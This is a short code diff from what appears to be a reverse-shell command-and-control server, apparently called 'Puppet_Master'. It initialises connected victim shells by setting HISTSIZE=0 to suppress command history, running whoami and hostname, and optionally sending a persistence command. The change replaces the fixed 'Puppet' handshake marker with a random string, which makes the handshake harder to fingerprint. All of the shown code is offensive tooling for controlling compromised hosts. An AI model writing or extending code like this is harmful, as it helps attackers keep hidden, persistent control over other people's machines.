@@ -74,6 +74,7 @@ async def handle_shell_init(reader, writer):
     randomStringWhoamiSuffix = randomString()
     randomStringHostnamePrefix = randomString()
     randomStringHostnameSuffix = randomString()
+    randomStringInitEndSuffix = randomString()
     init_command = str()
     init_command = "export HISTSIZE=0;"
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
@@ -85,7 +86,7 @@ async def handle_shell_init(reader, writer):
     if Puppet_Master.Persistence:
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
 
-    writer.write( "echo Puppet\n".encode() )
+    writer.write( f"echo {randomStringInitEndSuffix}\n".encode() )
     await writer.drain()
 
     while True:
@@ -93,7 +94,7 @@ async def handle_shell_init(reader, writer):
             data = await asyncio.wait_for( reader.read(40960), timeout=10 )
             init_data += data
 
-            if "Puppet" in data.decode():
+            if randomStringInitEndSuffix in data.decode():
                 puppetHash = getTextBetweenStrings(
                         init_data.decode().replace(f"echo {randomStringPrefix}", "").replace(f"echo {randomStringSuffix}", ""),
                         randomStringPrefix,
